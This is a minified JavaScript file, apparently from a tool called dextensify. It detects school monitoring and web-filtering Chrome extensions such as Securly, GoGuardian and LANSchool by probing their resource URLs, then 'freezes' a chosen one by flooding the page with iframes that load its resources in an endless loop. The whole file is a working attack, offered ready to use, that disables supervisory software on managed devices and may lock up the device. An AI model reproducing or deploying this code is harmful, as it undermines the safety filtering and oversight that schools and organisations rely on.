let from_id=e=>document.getElementById(e),extensions={securly_new:{name:"Securly",url:"chrome-extension://joflmkccibkooplaeoinecjbmdebglab/fonts/Metropolis.css"},securly_old:{name:"Securly (old)",url:"chrome-extension://iheobagjkfklnlikgihanlhcddjoihkg/fonts/Metropolis.css"},goguardian:{name:"Goguardian",url:"chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/youtube_injection.js"},lanschool:{name:"LANSchool",url:"chrome-extension://baleiojnjpgeojohhhfbichcodgljmnj/blocked.html"},linewize:{name:"Linewize",url:"chrome-extension://ddfbkhpmcdbciejenfcolaaiebnjcbfc/background/assets/pages/default-blocked.html"},blocksi:{name:"Blocksi",url:"chrome-extension://ghlpmldmjjhmdgmneoaibbegkjjbonbk/pages/blockPage.html"},fortiguard:{name:"Fortiguard",url:"chrome-extension://igbgpehnbmhgdgjbhkkpedommgmfbeao/youtube_injection.js"},cisco:{name:"Cisco Umbrella",url:"chrome-extension://jcdhmojfecjfmbdpchihbeilohgnbdci/blocked.html"},contentkeeper:{name:"ContentKeeper",url:"chrome-extension://jdogphakondfdmcanpapfahkdomaicfa/img/ckauth19x.png"},securlyclassroom:{name:"Securly Classroom",url:"chrome-extension://jfbecfmiegcjddenjhlbhlikcbfmnafd/notfound.html"},hapara:{name:"Hapara",url:"chrome-extension://kbohafcopfpigkjdimdcdgenlhkmhbnc/blocked.html"},iboss:{name:"iboss",url:"chrome-extension://kmffehbidlalibfeklaefnckpidbodff/restricted.html"},lighspeed:{name:"Lightspeed",url:"chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png"},interclass:{name:"InterCLASS Filtering Service",url:"chrome-extension://jbddgjglgkkneonnineaohdhabjbgopi/pages/message-page.html"},intersafe:{name:"InterSafe GatewayConnection Agent",url:"chrome-extension://ecjoghccnjlodjlmkgmnbnkdcbnjgden/resources/options.js"},gopher_buddy:{name:"Gopher Buddy",url:"chrome-extension://cgbbbjmgdpnifijconhamggjehlamcif/images/gopher-buddy_128x128_color.png"},lanschool_helper:{name:"LanSchool Web Helper",url:"chrome-extension://honjcnefekfnompampcpmcdadibmjhlk/blocked.html"},imtlazarus:{name:"IMTLazarus",url:"chrome-extension://cgigopjakkeclhggchgnhmpmhghcbnaf/models/model.json"},impero_backdrop:{name:"Impero Backdrop",url:"chrome-extension://jjpmjccpemllnmgiaojaocgnakpmfgjg/licenses.html"},mobile_guardian:{name:"Mobile Guardian",url:"chrome-extension://fgmafhdohjkdhfaacgbgclmfgkgokgmb/block.html"}};async function check_url(e){let n=new AbortController;setTimeout((()=>n.abort()),500);try{return await fetch(e,{signal:n.signal}),!0}catch(e){return(e+"").includes("AbortError")}}async function detect_extensions(){let e=[];for(let n of Object.values(extensions)){await check_url(n.url)&&e.push(n)}return e}async function main(){let e=await detect_extensions(),n=from_id("buttons_container");if(window.chrome){if(0===e.length)return n.innerHTML="<p><b>Error: No supported extensions detected.</b></p>",void(n.innerHTML+='<p style="margin-top: -16px;">If you want support for a specific extension added, please make an issue on the <a href="https://github.com/ading2210/dextensify">Github repository</a>, and provide the extension ID and manifest.</p>');n.innerHTML="";for(let o of e){let e=document.createElement("button");e.innerText=`Freeze ${o.name}`,e.onclick=()=>{button_handler(o)},n.append(e)}}else n.innerHTML="<p><b>Error: You are not running a Chromium-based browser.</b></p>"}function button_handler(e){!confirm("After hitting OK, there will be a 5 second delay until the extension starts being frozen. Switch to another tab immediately to prevent the entire device from locking up.")||setTimeout((()=>{create_iframes(e)}),5e3)}function create_iframes(e){let n=[],o=5,t=e.url;for(;;){let e=document.createElement("iframe");document.body.append(e),n.push(e);for(let n=0;n<50;n++){let n=document.createElement("iframe");n.src=t,n.style.width=n.style.height="1px",e.contentDocument.body.append(n)}for(;n.length>Math.max(3,10-o);)n[0].remove(),n.shift();o++}}window.onload=main;